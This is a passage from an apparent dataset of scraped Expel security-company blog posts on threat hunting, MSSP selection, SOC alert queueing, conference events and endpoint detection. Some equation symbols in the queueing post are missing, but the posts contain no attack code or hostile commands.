each hunt, we wrote a library of a few good downselects, like a widget that displays frequencies of recurring events, a bar chart that displays the number of events over time, and a widget for looking up domains and IPs using our partner APIs. We can reuse these downselects between different hunts to reduce the overall amount of code and maintain consistency for our analysts between hunts. Fewer panes of glass drive efficiency Nobody likes looking through multiple panes of glass to conduct a hunt technique. We learned this early on. We used to have analysts hunt in one browser tab, with a suggested workflow and technique guide in another browser tab. We quickly discovered its too hard to keep flipping back and forth. In our current template, we keep the same layout to maintain consistency for analysts between different hunting techniques, which reduces the amount of jumping around between different tasks within the workflow. Our layout includes the following items in this order: Authentication handler for various APIs Overview of the hunt technique What pre-filtering has already been applied during data collection Key things to look for and what evil might look like Suggested containment or remediation steps if evil is identified Analyst notes, tags and suppressions We just show what is relevant to the active hunt and hide inactive tags and suppressions Hunt data All of the unsuppressed results are displayed here with the ability to sort, filter and search Downselects Each downselect includes four keys in the YAML config file: Title: High level summary of what the downselect does Description: How is the data being manipulated or filtered and why Observables: This is a list of very specific things the analyst should watch out for that would represent indicators of known evil References: This is a list of internal and third-party resources where the analyst can learn more about the specific security aspect or indicator focused on by the downselect; it includes things like links to specific MITRE Att&amp;k articles or reputable blog posts The downselect data; sometimes the data is a table which can be sorted, filtered and searched but other times its a bar chart, diagram or map The downselect data appears directly in line and above the reference data to reduce pivots for the analyst What were seeing so far Now that we have better stats for hunting, we have a clearer understanding of the volume of data our analysts are reviewing, what hunts require more or less time to analyze and complete and the amount of findings being reported by our various hunts. Its still early for us when it comes to collecting metrics, but were starting to make more informed decisions about what hunts are working, why theyre useful and where they tend to work best. This will help us continually improve our overall hunting program. Whats next Were still in a test, learn, iterate phase when it comes to JupyterHub, improving our hunting tools and techniques over time. As we identify the things that work best for our analysts, were recording those items for our blueprints and wish lists and making continuous improvements to our hunting program.'}) (input_keys={'title'}),
  Example({'title': 'Viva Las Vegas! Expel heads to Black Hat', 'url': 'https://expel.com/blog/expel-heads-to-black-hat/', 'date': 'Jul 19, 2022', 'contents': 'Subscribe  EXPEL BLOG Viva Las Vegas! Expel heads to Black Hat Expel insider  2 MIN READ  KELLY FIEDLER  JUL 19, 2022  TAGS: Company news Q: Whats the best part about summer? A: Summer Camp. Except this time, leave your bug spray and sleeping bag at home. Hacker Summer Camp (AKA: Black Hat) is back, and were ready to pop up our tent (re: booth) on the show floor for the first time as exhibitors! Hot off of RSA Conference (RSAC), our carry-on bag to Vegas is full of recent, impactful product advancements to help our customers stay ahead of the cyber threats of today (and tomorrow). Think: ransomware, business email compromise (BEC), supply chain attacks, cryptojacking, and so on. So how do we help? First, Expel plugs the gaps in your detection coverage. Our friendly detection bot, Josie, uses your unique business context to enrich and correlate alerts to detect things earlieramplifying signals to spot behaviors you could otherwise miss across on-prem, cloud infrastructure, and SaaS apps. Then, our other (equally friendly) bot, Ruxie, does the tedious triage work so that humans can focus on the response decisions that humans make best. We quickly get to remediation (recommendations or automatedyou tell us!) to stop threats from spreading. The best part? We do all of that in 21 minutes or less. Yupthat fast. When its all said and done, we look at each investigation as a learning opportunity. We ask ourselves key questions, like: what were the root causes? And how do your peers compare? The whole time, our enhanced dashboards show you how your existing security investments and Expel are performing, so you can keep us accountablea strategy which only increases in importance as more applications and workloads move into the cloud. At the end of the day, we know security isnt just a checkboxit should empower your business. Were here to help your security team understand and address issues, minimize risk, and grow. If you cant tell, we love geeking out about this stuffand wed love to geek out with you in Vegas. To kick things off at Black Hat, were hosting a  Cuts &amp; Cocktails  reception at The Barbershop in the Cosmopolitan on Tuesday, August 9, 6  9pm PT. Register here for a fresh cut, shave, (dry) hair styling, and makeup touch-ups to help you get ready for a night on the town and to hit the show floor. After you freshen up, head to the authentic speakeasy hidden in the back of the barbershopdont tell anyone we told youfor craft cocktails, heavy hors doeuvres, and the return of YouTube ( and RSAC ) sensation, Harry Mack ! (Shoutout to our sponsors, Tevora and Exabeam , for helping to make it all happen.) If you want to see for yourself how Expel is helping companies of all shapes and sizes make sense of security, book a meeting and stop by our booth (2861) on August 10 and 11.'}) (input_keys={'title'}),
  Example({'title': "Warning signs that your MSSP isn't the right fit", 'url': 'https://expel.com/blog/warning-signs-mssp-isnt-right-fit/', 'date': 'Nov 2, 2017', 'contents': 'Subscribe  EXPEL BLOG Warning signs that your MSSP isnt the right fit Security operations  7 MIN READ  ANDREW HOYT  NOV 2, 2017  TAGS: Managed security / Management / Selecting tech There are two sides to every relationship. When they go bad its easy to blame yourself. But Im here to tell you, dear reader, that you dont need to (and shouldnt) accept mediocrity. There are many managed security service providers (MSSPs) out there  some of which do a few things really well, and some that well dont. If youre trapped in a failing (or failed) relationship with your MSSP youre not alone. Here are some warning signs to look out for that indicate its probably time to start considering some other options. Warning #1: The MSSP cant use the new product(s) you just bought You fought hard for budget and youve spun up the new [insert cool technology product] in your environment. You even splurged on hiring and training staff to set it up, maintain it and look at the logs/alerts it generates. Why? Because that data is important to you. Except, you were hoping your new MSSP would be able to take that work off your hands so you can redeploy those resources. Thats why you were so surprised when your MSSP told you that not only do they not support your new product, theyve got their own flavor of the product you just bought and theyre going to have to put it in your environment for the service to work. So much for deploying those resources elsewhere. Youre also going to need to find a way to correlate that data with the stuff coming from your MSSP, so youll probably just dump everything into a SIEM and treat the MSSP as another alert feed. Thats not how it was supposed to be (and it really doesnt have to). The right partner should use your existing technology. They shouldnt just integrate with the meat and potatoes technologies in your infrastructure (think firewalls, IDS/IPS). They should also use the shiny new technologies youve invested in to find modern threats (think endpoint detection and response (EDR)). If you see this warning sign here are a few questions to keep in your back pocket: What do you need to do to deploy the MSSPs service? Correct answer: Minimal software, no hardware, simple configuration changes. What, if any, additional products do you have to buy or replace to get value out of the service? Correct answer: None. What products do they support? Correct answer: Hopefully everything you already have. Realistic answer: The majority of what you have, especially the technologies youre already monitoring yourself and other important components are on the roadmap. This should include network and endpoint technologies! Warning #2: The onboarding process never ends You made it through the procurement process and got a signature on the contract. You thought youd be off to the races. But your MSSP dumped a bomb on you in the first calland your stomach dropped a bit. There were hundreds of pages of documentation, dozens of phone calls and meetings and project plans that stretched out into forever. Its months later and youre still onboarding while the promised value still lies somewhere over the (infinite) horizon. Your standards can and should be higher. The right partner should provide an onboarding experience thats point-and-click easy  closer to your smartphone than a call to your Cable TV providers customer support line. Once data is flowing to your provider, you should be receiving value. In short, onboarding should take days (or even hours), and value should come in less than a week. If you feel like youre entering the onboarding danger zone ask these questions: How long will it take to onboard all in-scope technologies for the service? Correct answer: A week, max. Is there documentation for the onboarding process? Can I see it? Correct answer: Yes and yes. Anda bonus question. Can I onboard a device (or three) as a proof-of-concept before I sign up for the service? Correct answer: Wed love that Likely answer: Ummmm [awkward silence] Warning #3: Youre getting lots of alertsbut few answers Youre onboarded! Youre getting ready to sit back and let your MSSP work for you. And then it happens. Your morning email digest shows up and its full of alerts. 50 of them to be specific. What happened? Which ones are most important? Has there been a breach or are they just suspicious? Are any of the alerts related to each other? Or are they independent events that should be treated as separate incidents? How were they detected? Is this the beginning, middle, or end of an attack? Why does your MSSP hate you so much that they hand you these tiresome riddles every single day? Each alert should be a means to an end. Rather than accepting a pile of questions, find a partner that will give you answers. What happened? When? How? Whats the risk? What should you do next? These are the answers youre paying for, not hey, heres some alerts. More important, what is the data telling you over time? Your MSSP should be able to help identify trends and make strategic recommendations that reduce overall risk in your environment. In retrospect, these are the questions you would have asked during the sales process: Can I see a demo of your portal including the technical data and investigative reports Ill receive? Correct answer: Glad you asked. Here are the answers well give you. How will I know when theres an incident that matters? How do your analysts investigate them? Correct answer: Click. Look here. You can see exactly what our analysts are doing and why theyre doing it Likely answer: Blah, blah, blah, alert stream, blah, certifications, blah, intelligence, blah, SLA. How do you measure the value you provide? Correct answer: Look at this dashboard. You can see how things are trending and the impact of our recommendations. Likely answer: Alerts detected each month. Warning #4: Youre finding evil days (or weeks) before your MSSP does You found something bad (for the fourth time) days before your MSSP ever told you anything. There could be lots of reasons: they cant see it, they cant detect it, their processes are weak or maybe their analysts just dont know much about you and your environment. Reducing the time from detection to response is a key metric for measuring risk mitigation in your environment. Context around what the threat is, how it got there, and what its doing (or will do) are all critical when responding to attacks. Your MSSP should have the ability to pull alerts from your technologies, apply threat intelligence, and correlate activity across the network, endpoints and your SIEM before they send the activity to an analyst. This ensures theyll be able to tell the whole story. A good provider will tell you things about your environment  including your own tools and investments  that you didnt already know. In some cases theyll tell you things that arent even related to a security incident. But youll still care about them. They might reveal asset misuse or a misconfiguration issue. Either way, fresh eyes should consistently find fresh issues that matter to you. Your MSSP analysts should have close to (if not the same) visibility into your network that you do. That means shared tools and endpoint visibility. Your MSSP will also have a versatile detection engine to make sure they can catch increasingly sophisticated attacks. If youre being notified late (or never), or getting very little context, its time to find alternatives. The answers to these questions will tell you if your team will be better at detecting threats than your MSSP: Can you implement these basic detection use cases that are important to me? Correct answer: Of course, and heres how wed do it. Can I see examples of incident notifications? Correct answer: Yes, they include all the context you need to respond to the incident. What data do your MSSP analysts see when they triage an alert? Correct answer: They have host visibility (think EDR) and can connect directly to your security technologies to investigate activity. Warning #5: Youre hiring more people to manage your MSSP Youre starting to dig into the service and youre getting that nervous feeling. The service looks great, but its complicated. And you already know youre not going to be able to use this thing without help. Never fear! Thats when your MSSP introduces you to their professional services team! Theyd be more than happy to sell you expensive people who can help make the thing you bought actually work (services for a service!). Or how about this? You still have a tier-1 analyst team that uses the alerts from the MSSP the same way theyd use alerts from any other product. They get ingested into your SIEM and your team looks at them along with all of the other alerts the MSSP isnt capable of generating since they cant support some of the technologies you have. Either way, youre stuck doing it yourself and creating even more work for you and your team. Yes, this actually happens. We know people (you know who you are) in this exact situation. Of course, the goal of any managed solution is to augment your existing capability so you and your team (if you have one) can spend less time fighting fires and more time working on strategic initiatives. When you have to add more firefighters to the team, its probably because your MSSP is adding to the fire and not helping put it out. A good provider will reduce the time and money you spend on security operations tasks, not increase it. Heres how to tell if youre at risk for being on the wrong end of this equation: Include the people on your team who will be working with the service in the tech demo and let them ask questions. Do they feel comfortable using the service to do their jobs? Are they comfortable with the outputs of the service? Sit down with the vendor and map out the workflow between you and your team. How will your team use the service on a daily basis? Is the MSSP adding more steps to your process, or removing them? Does your workflow overlap, or is the MSSP just throwing more alerts over the fence and expecting you to fend for yourself? Go back to your detection uses cases. Did you bring a few that are important to you? If the MSSP cant implement them then youre stuck hiring people and purchasing technology that can.  Remember, your MSSP should help you get more value out of the technologies youve already invested in and augment your security team. Above all else, your MSSP should give you answers (not just alerts) so you can improve your security posture in a measurable way. This can only happen if the service is easy to setup, easy to use, and versatile enough to align with your teams workflow and goals, not the other way around. As you evaluate your options, dont be afraid to include your team in the conversation. After all, theyre the ones thatll have to work with the MSSP on a daily basis. Are they excited with what they see? If so, you know its because itll make their lives easier, not harder. Theres no better litmus test than that.'}) (input_keys={'title'}),
  Example({'title': 'Watch out EMEAhere we come', 'url': 'https://expel.com/blog/watch-out-emea-here-we-come/', 'date': 'Oct 18, 2022', 'contents': 'Subscribe  EXPEL BLOG Watch out EMEAhere we come Expel insider  1 MIN READ  CHRIS WAYNFORTH  OCT 18, 2022  TAGS: Company news For the past six-plus years, Expel has been a company firmly rooted in North America. Its where a lot of our customers are, its where our people are, and its where we are making big strides in changing the cybersecurity landscape for the betterall to provide our customers with security that makes sense. Today were excited to announce that were expanding across the pond and setting up shop in EMEA (the United Kingdom, Ireland, the Netherlands, and Sweden to be exact). Why are we making this move? Common cyber threats, like business email compromise (BEC), business application compromise (BAC), phishing, ransomware, cryptojacking, and more, impact companies globally. Our approach, centered around our combination of people, processes, and technology, can deliver the same positive cybersecurity outcomes to companies in these places that weve experienced at home. We at Expel have proven that we can be effective in helping our customers mitigate these threats, and do so quickly, often hand-in-hand with our customers security teams. Plus, the collaborative experience in the Expel Workbench platform gives customers freedom in how they manage their security operations  whether thats following along with live investigations, or receiving alerts at every step from when an investigation starts until its done. This transparency means customers always know whats happening, and is a core value at Expel. Were fortunate to have a few EMEA-based customers already, so weve laid the groundwork for our approach in the region. Were also employing a channel-first sales model that leverages resellers regional and industry-specific expertise. To meet the needs of our growing customer base, were building out our team. In fact, Im Expels first Europe-based employee! You can read more about me and Expel in general here , if youre interested! (BTW, were hiring ). Were really thrilled to be expanding Expel into EMEA as the first step in our international journey. Keep an eye on our blog as we continue to share more information about our expansion into EMEA (and beyond)!'}) (input_keys={'title'}),
  Example({'title': "We're definitely stronger together: top 3 takeaways from ...", 'url': 'https://expel.com/blog/were-definitely-stronger-together-top-3-takeaways-rsa-conference-2023/', 'date': 'May 5, 2023', 'contents': 'Subscribe  EXPEL BLOG Were definitely stronger together: top 3 takeaways from RSA Conference 2023 Expel insider  3 MIN READ  KELLY FIEDLER  MAY 5, 2023  TAGS: Cloud security / Company news / MDR / Tech tools Were still whirling from our second year on the show floor at RSA Conference (RSAC) 2023! It was a week well-spent, full of interesting sessions, meaningful connections, and a whole lot of fun. The conference buzzed with pre-pandemic levels of excitement as we maneuvered through Mosconechatting with friends and swapping tales from the security operations center (SOC) on the latest cybersecurity threats and trends. Our team at the booth stayed busy from opening to closing announcements each day, giving demos, talking shop, and showing an approach to security that can actually be delightful. Also, local artist Bee Betwee joined us to create an art installation highlighting the many faces, backgrounds, and experiences that represent cybersecurity, a tangible ode to this years theme of Stronger Together. Now that the dust has settled and weve had some time to reflect, here are our top takeaways from the show. There are lessons for defenders in the most unexpected places. The most surprising thing from this years conference? How star-studded an affair it really was! From Saturday Night Live legend Fred Armisen, to Monty Pythons Eric Idle, country music sensation Chris Stapleton, and famed physicist Michio Kaku (to name a few), it was hard not to be a little star-struck at this years conference. But even if their sessions werent exclusively about security, the undercurrent of community and collaboration was ever-present. RSAC is about the fellowship among defenders, as were all tasked with the same challenge. Our adversaries are just as creative, smart, and well-resourced as we are, so our best advantage is to band together in fighting the good fight. (Who knew how much we needed a rendition of The Beatles, All You Need Is Love, led by Fred Armisen, to remind us?) Generative AI is here to stay, and its up to us to use it wisely. The promise of generative artificial intelligence (AI) represents as great an opportunity as it does a responsibility. It has the potential to change livesfrom relieving burnout by handling tedious tasks, to the effect it can have on the cybersecurity skills gap in both training and breaking down barriers for equity and inclusivity. The onus is on us, the defender community, to make a conscious effort to encourage mindful use of these tools to ensure theyre fed with a diversity of thought and experiences. Our concern shouldnt be about what AI can do on its own, but what people can accomplish when we harness this technology correctly. Security-specific AI requires the combination of AI, hyperscale data, and threat intelligence, balanced with people as the important decision makers. This is a balance weve believed inand done, with our friendly detection and response bots, Josie and Ruxiesince our inception, as our founders started Expel with a technology-forward approach. At the end of the day, were solving people problems. From the talent gap, to the challenges and excitement presented by AI, to \u200c cybercriminals themselves, the common challenge is clear: we face a people problem. Whether talking about the White House security or the World Cup, the core takeaway was that the only way forward in the cybersecurity battle is to face it together. Another one of these people problems we talk about a lot is burnoutits an industry buzzword for a reason. Analysts drown in reams of alerts daily, and its no secret that, without the right tech in place, the triage is tedious. So how can we do high-quality work without making our people miserable? From the jump, weve believed the key to solving this people problem boils down to resourcingfinding the right combination of skilled analysts and advanced automation that lets each do what they do best. Throughout the week, one thing was evident: its going to take a village. The Stronger Together theme really resonated with us at Expel because weve always believed in collaboration and information sharing amongst the defender community to make us better as a whole. Its the reason we continue to share trends and recommendations from our SOC with our quarterly and annual threat reports, and why we keep it real here on our blog. Were also continuing to expand our solutions portfolio to keep pace with cybercriminals. At RSAC, we announced Expel Vulnerability Prioritization , a new solution that highlights which vulnerabilities pose the greatest risk, so organizations can take immediate, informed action. Were just getting started this year, and we cant wait to keep up the momentum. If you want to keep the conversation going, drop us a line anytime. And if youre interested in seeing our security operations platform, Expel Workbench, in action, you can sign up for a free 14-day trial of Expel MDR for Cloud Infrastructure here .'}) (input_keys={'title'}),
  Example({'title': 'What "I Love Lucy" teaches us about SOC performance', 'url': 'https://expel.com/blog/what-i-love-lucy-teaches-us-about-soc-performance/', 'date': 'Mar 14, 2018', 'contents': 'Subscribe  EXPEL BLOG What I Love Lucy teaches us about SOC performance Security operations  8 MIN READ  MATT PETERS  MAR 14, 2018  TAGS: Get technical / How to / SOC In September 1952, I Love Lucys Lucy and Ethel decided to go to work in a candy factory. They were placed on an assembly line and told to individually wrap chocolates as they passed by . If any of these end up in the packing room unwrapped, youll both be fired, the supervisor said. The situation was fraught, and hijinks ensued. By the time cameras stopped rolling, Lucy and Ethel had fallen behind. Unwrapped candy was flowing into the packing room and both women had resorted to eating chocolates to try to stanch the flow. Back in the 1950s, this account of an overloaded system was comedy gold. But youre probably wondering what any of this has to do with information security. Well, we see this type of thing pretty regularly in the security world. Its usually called alert fatigue and its not nearly as funny. Whether its chocolate or alerts, fundamentally were talking about the same problem: were underwater, weve started resorting to a ton of things we know arent the right solution just to keep up and yet were still underwater. When confronted with this situation, CISOs (or chocolate-factory owners) need to make some decisions about how to get out of trouble. Itd be a mistake, however, to just start making changes. Its best to make sure that you understand the system first. The system Using broad brush strokes, all systems that process work items (or jobs) can be boiled down to three basic elements: jobs, processors and buffers. Jobs are the work items that flow through the system and get processed. Lucy and Ethel had chocolates, the security world has alerts, incidents, engagements and the like. Processors are the things that do the work. These are people and machines who take one thing and turn it into something else. This definition includes everything from Lucy and Ethel, who process chocolates by wrapping them, to your SIEM that takes a bunch of log data and correlates it together as a single security alert. Buffers are components that allow a looser coupling between one processor and another. They primarily function during burst demand to keep the system from collapsing. There are three primary types of buffers: Capacity: You can add more people/processors to your production system. This is what happens when your grocery store adds more checkout people during a rush. Inventory: You can store up work to do later when a processor is idle. Anytime you see a warehouse or a table of parts in a workshop, youre looking at a buffer. Security teams, sadly, do not benefit from these  inventory does not exist in the security world. Time: You can take longer to produce something. Ever been to the DMV? If so, youve experienced a time-based buffer. The three elements of systems Okay, Im going to warn you that this is where things get a little nerdy (and a little math-y). If you thought it was nerdy before, then well  brace! But rest assured the math will lead us to a place of better understanding. Here goes. Every production system involves some configuration of the three elements above, organized to optimize for some outcome. For example, if chocolate arrives on the conveyor belt at an average rate , and Lucy and Ethel can each wrap chocolates on average, we can show the chocolate factory schematically like this: If chocolate arrives on the conveyor belt at an average rate that equals the average processing rate, then everything will be ducky, right? Wrong! And this is where things begin to go off the rails for our heroines, and many times, for hapless security operations teams. Variation: the source of security operations potholes If you watch the video closely you may notice that Lucy and Ethel were doing OK for the first little bit. Then Lucy misses a step and starts to stumble. From this point on, theyre doomed 1 . The issue here is variation. If a job takes too long, then the next one gets started late, and the next one, and so on  the system will never catch up. In the real world, processors arent perfect: a chocolate is hard to pick up, alerts turn into investigations, attackers get creative  variation is in everything. And when quality begins to slip, this problem can compound  unwrapped chocolates may be returned for re-work, increasing the input rate and causing the problem to get worse. With this in mind, were better off viewing the chocolate factory more like this: Chocolate is still arriving at an average rate of , and being serviced at an average rate of , but now theres variation in these rates (as indicated by standard deviation or ).This variation is the root of many a smoking crater in the security operation center (SOC). Waltz or hip hop in the SOC? The intricate dance between variation and utilization. In the event of a big burst of inbound work like Valentines Day at the flower shop (or a new signature set from an IDS vendor), most production managers will ask the team to dig deep and work a little harder to clear the backlog. In more formal terms, the manager is increasing utilization, which may increase throughput. Whats not entirely obvious, though, is that this also makes the system more fragile. Why? You guessed it  variation. In SOC operations, alert processing time is often a big concern. Attackers are on the move and people want to know how long will it take us to go from a signal to a reaction? To see how the relationship between variance and utilization impacts alert processing time, its helpful to express the relationship mathematically (in this case with the Kingman approximation 2 ). In case math isnt your thing, what this equation says is that the estimated service time is related to the variance in the arrival and service times (V or ), the utilization of the processor (U or ) and the average service time  s . Lets make a few assumptions to turn this equation into a real example: Alerts arrive, on average, every 10 minutes. The standard deviation is three minutes, so On average, it takes you two minutes to triage them, with a standard deviation of four minutes (they vary wildly), so Your utilization is 70 percent, so Based on those assumptions, the equation tells us that the average alert wait time will be: In case deciphering equations isnt your thing, what this means is that it will take about 9.47 minutes before an alert gets reviewed in this system. This is a little tight, but probably alright since the alerts are only arriving every 10 minutes on average . As the variance in our process increases, the alert wait time will increase. This makes sense since our analysts will be spending more time on some of the alerts, which forces newer alerts to wait longer. This is compounded by utilization. If we, like Lucy and Ethel, are already at 90 percent capacity and a single variation happens, it can knock us off our game. The chart below shows the effects of increasing variation at two different utilizations: 70 and 90 percent. The wait time in the process with 90 percent utilization increases much faster than when there is a buffer to absorb it. There are a few interesting things about this relationship, which can help us plan better: The average service time is one of three factors that contribute to service time. Making each member of your team faster is not the only thing in play. The utilization term tells us that operating a SOC team (aka a processor) at close to full capacity will magnify any variance in the system. If Lucy had time to correct her first mistake, the episode would have been less funny because she would have had some buffer to recover. The inclusion of variance as a term is a bit more abstract. In a toll booth you separate out the people with E-ZPass/FasTrak and the people who pay with bills so you dont stick a bunch of fast people behind someone paying with change theyre still digging out of their seat cushions. Perhaps the most important thing this equation tells us is that these quantities are multiplicatively related  small changes in variance in a system that is already at 90 percent utilization will be catastrophic to service time. Similarly, small changes in utilization have the potential to move the needle quite a bit. Thats enough math. What does it mean for my SOC? Lets say youre a CISO with a team of three thats buried in 200,000 alerts a day. What should you do? And how does any of this help? Good question, heres a rough schematic to use as a strawman: Given this diagram, lets look at the knobs we can turn: Inventory buffers : While our SIEM is useful to provide a little rate-decoupling, its not really an option to store the alerts and work them next week  the attacker wont wait on us. Quality : We cant reduce the quality of our work to speed it up. Wed miss things and that would be bad. Were not without hope though, there are still some dials we can turn: Dial #1: Tune your devices (arrival rate) It goes without saying that if the average arrival rate exceeds the average service time, youre hosed. As we learned above, if the average arrival rate equals the average service time, then the system is iffy at best. Tuning your devices is the number one way to adjust arrival rate. SIEM and IDS technologies are legendary for the firehose of alerts problem. Investing time in filtering and tuning these, or investing in technology with a higher signal-to-noise ratio is probably the number one thing you can do. Guard against purchasing additional gear without tuning existing devices  new signal compounds the problem. Dial #2: Increase alert triage efficiency (service rate) The time it takes to process an alert is: Measuring these times, or at least having a rough idea of how long they take is instructive: If 99 percent of all alerts are closed out during triage, then investment there will have the biggest bang. Automating alert enrichment and providing context will speed up triage, while training your SOC analysts can boost capacity so each analyst can handle more alerts. To decrease the time to investigate, endpoint detection and response (EDR) or network forensic tools are your first stop. Many shops skimp here, and that may be a mistake. If one investigation takes eight hours because it has to be done manually it can easily swamp a small team. An EDR tool could reduce investigative time to an hour or less. Dial #3: Hire more analysts (capacity) If, after optimizing the time it takes to triage a single alert, your service rate is still lower than your arrival rate, youve got to add capacity. That means hiring analysts. This can be an expensive proposition , though there are alternatives . Dial #4: Variance (aka the unexpected) As the Kingman equation shows us, the variance thats so pervasive in security operations can uncork an otherwise well-regulated system. There are two components to this: Arrival rate  if your team comes in every morning to a flurry of new work, consider staffing a night shift. This can keep the work from building up and smooth out the workflow. Outside of that, theres really not much you can do to adjust this variance. Service Rate  there are two things that can help here: automation and training. Experience tells us that training should almost always be our first stop  in the world of cheap python scripts and API-driven applications, human variance is by far the more pernicious of the two. Conclusion Alert fatigue in a SOC is a real problem and one that just about every organization has to deal with. Its such a problem that  for better or worse  theres an entire SOC role whose sole job is to help cope with it. The problem that many organizations encounter when they try to address alert fatigue is that they dont take the time to understand the system that theyre trying to change. Instead, they just start making changes. Lots of times those changes include tweaks to their processes intended to achieve admirable-sounding outcomes like reduce the time it takes to investigate a security incident. But if you dont take the time to understand the system, you can get some undesirable outcomes. For example, you might reduce the time it takes to investigate a security incident only to find that youve unwittingly changed your system in such a way that youre now missing actual security incidents. If youre a fire chief, it doesnt make a lot of sense to put Ferrari engines in fire trucks so you can get to the fires faster. So, before you implement your SOC metrics program , before you start tweaking your SOC processes and before you start making staffing adjustments, take the time to understand the system that youre operating so you know how changes to that system will impact its operation. After all, theres only so much chocolate that two people can stomach if the system goes off the rails. ___________ 1 It does not help that the assembly line actually sped up during the scene, but the result would have been the same at a constant rate. 2 For the sake of simplicity, were modeling the single processor case. In normal SOC operations, youd use the G/G/c form of this.'}) (input_keys={'title'}),
  Example({'title': 'What is (cyber) threat hunting and where do you start?', 'url': 'https://expel.com/blog/what-is-cyber-threat-hunting-and-where-do-you-start/', 'date': 'Apr 9, 2018', 'contents': 'Subscribe  EXPEL BLOG What is (cyber) threat hunting and where do you start? Security operations  5 MIN READ  JEN BIELSKI  APR 9, 2018  TAGS: Example / Hunting / Mission / Overview Sometimes the security landscape seems like a big game of telephone. A buzzword pops up. It may even be a good one. But then it enters the vendor echo chamber. Everyone starts repeating it to each other. The vendors CEO says Weve got to put that on our website. The sales VP says Weve got to put that on our tradeshow booth. And before long everyone in infosec is sayin it but nobody really knows what it means. Usually its defined as whatever the definer is doing. Its kinda funny. But its really not. Because if youre charged with making your organization more secure youre left wondering whats real(ly important) and whether you should care. The term hunting is a good example. It has been kicking around for almost seven years since it was first introduced in 2011 . The fact that its had more time to marinate than some of the newer buzzwords may be why its so confusing. Whatever the reason, at Expel we want to demystify what hunting is and what its not. So here goes nothin. What is hunting? In short, hunting is a proactive effort that applies a hypothesis to discover suspicious activity that may have slipped by your security devices. Now, that doesnt mean you cant use your security tools to go hunting (well get to that in a bit). But looking at alerts coming from your endpoint detection and response (EDR) tool isnt hunting. Its alert management. And pretty much anything on this list also isnt hunting. Comparison of hunting vs. alert management Heres another way to think about it. With hunting youre assuming that something has already failed and youve been compromised. The attacker has gotten past the perimeter (aka inside the network) and youre looking for them. Since you dont know where the attacker is hiding or who theyre trying to impersonate youll need to start with a theory based on common tactics attackers use. Then, once you know how you plan to seek out the attacker youll need to look to take a closer look to identify activity that looks a little off. Things that dont look normal become investigative leads for an analyst to further review. Hunting process overview Example: Finding stolen user credentials (aka You cant travel that fast!) Attackers use lots of different methods to steal user credentials so they can blend in with normal activity and avoid suspicion. But when attackers use those stolen credentials to access a system their location is usually drastically different from the users real location. For example, an attacker in New York could login with stolen credentials and  thirty minutes later the real user could login in Los Angeles. Planes just dont fly that fast (not to mention TSA). By reviewing the location of successful user logins, you can identify login activity that is too geographically disparate to represent legitimate user travel. Heres what that would look like if we applied the process we outlined above. Hunting technique example: finding compromised accounts using login geo-infeasibility What do you need to start hunting (the basics) Now that weve talked about what hunting is, lets identify the basic tools youll need to hunt. Heres your shopping list starting from the hardest to find, to the easiest. 1. Someone (or some people) to do the hunting: Thats right. Hunting requires humans. Or at least human judgment to evaluate the data you collect. If youre lucky, you may already have someone to perform this task. But if youre smaller, or your security program is still maturing youll have to go hunting (heh) for someone. And that can be tough . Good threat hunters have typically done a stint on an incident response team, theyre itching to do some forensics and theyve probably reversed at least one piece of malware just for fun. To translate, theyre not cheap, or easy to find. And once you find them you need to keep them (which can be easier said than done ). Of course, if you decide you dont want to or cant find your own hunters, theres a line of security vendors and managed detection and response (MDR) providers that would love to help you. 2. Security device to collect data: Once youve sorted out the pesky people problem, your next task will be to feed them some data. For that, youll need security devices. Endpoint detection and response (EDR) tools are a good place to start, but theyre not the be-all-end-all. Endpoints are a source of the truth, but your firewalls, SIEM or network forensics tool also collect data with crucial details for identifying malicious activity and filling out the story. The more data you can collect, the more you can hunt for. But dont get hung up on the tools. At a minimum, if youve got either an endpoint or a network tool youve got what you need to get started. 3. A list of things to hunt for: Finally, youll need to decide what you want to hunt for. Knowing the tactic you want to sleuth out will guide the data youll need to collect and what outliers to look for. The MITRE ATT&amp;CK framework is a good starting point. In fact, its what we use here at Expel. It outlines the tactics and techniques attackers commonly use at each stage of the attack lifecycle. As you consider what you want to hunt for youll have to make sure that you have tools that can feed you the specific type of data you need. And be realistic about how much time you have. If you choose to outsource your hunting capability, make sure you ask your service provider to explain how theyll be hunting and how their techniques align with the security tools youve got. If their answers are squishy, its time to move on. Is hunting right for your organization? Now that weve (hopefully) taken some of the mystery out of hunting you may be wondering if its something that should even be on your radar. While it does provide an extra level of security, its not practical for every organization to implement a hunting program. We recommend evaluating your risks and resources to determine if you should develop a hunting program. If you operate in a high-risk (and highly targeted) environment  think banks, defense contractors and companies that store large amounts of personal and financial information  then hunting probably makes sense because there are lots of adversaries trying to infiltrate your network. But if your organizations risk profile is medium- to low-risk, youre likely the target of commodity malware and should evaluate where your resources are most needed. In that case, hunting can take up a lot of time and distract you from things that should probably be much higher on the priority list like effective anti-phishing controls, asset management, third-party assessments and a myriad of other things that make up an effective cyber risk program. Doing security right is difficult, and focusing on hunting when you should be focusing on building a more secure foundation can actually make you less secure. Either way, you should make a conscious decision about whether youre hunting or not. Dont accidentally start hunting because your staff started chasing shiny things and found themselves looking at suspicious activity all over your network. That said, if you decide a formal hunting program makes sense here are two good places to start. 1 Credential access. MITRE tactic description, https://attack.mitre.org/wiki/Credential_Access 2 Lateral movement. MITRE tactic description, https://attack.mitre.org/wiki/Lateral_Movement 3 Execution. MITRE tactic description, https://attack.mitre.org/wiki/Execution'}) (input_keys={'title'}),
  Example({'title': 'What is Windows Defender ATP &amp; Is It Any Good? - Expel.io', 'url': 'https://expel.com/blog/windows-defender-atp-our-two-cents/', 'date': 'Sep 1, 2020', 'contents': 'Subscribe  EXPEL BLOG Is Microsoft Defender for Endpoint good? Security operations  8 MIN READ  TYLER FORNES AND MYLES SATTERFIELD  SEP 1, 2020  TAGS: Alert / EDR / Get technical / Managed detection and response / SIEM Its no secret that the industry has eyes for Defender for Endpoint. After a few months of using and integrating it with our platform, we feel the same. In a few other posts, weve shared our thought process on how we think about security operations at scale and the decision support we provide our analysts through our robots. In short, Defender for Endpoint made it really easy for us to get to our standard of investigative quality and response time without requiring the heavy lift to get the features we needed upfront. So what is Microsoft Defender for Endpoint? Microsoft Defender for Endpoint is an enterprise endpoint security product that supports Mac, Linux and Windows operating systems. There are a ton of cool things that Defender for Endpoint does at an administrative level (such as attack surface reduction and configurable remediation) however from our vantage point, we know it best for its detection and response capabilities. Defender for Endpoint is unique because not only does it combine an EDR and anti-virus (AV) detection engine into the same product, but for Windows 10 hosts this functionality is built into the operating system (removing the need to install an endpoint agent). With an appropriate Microsoft license, Defender for Endpoint and Windows 10 provide out of 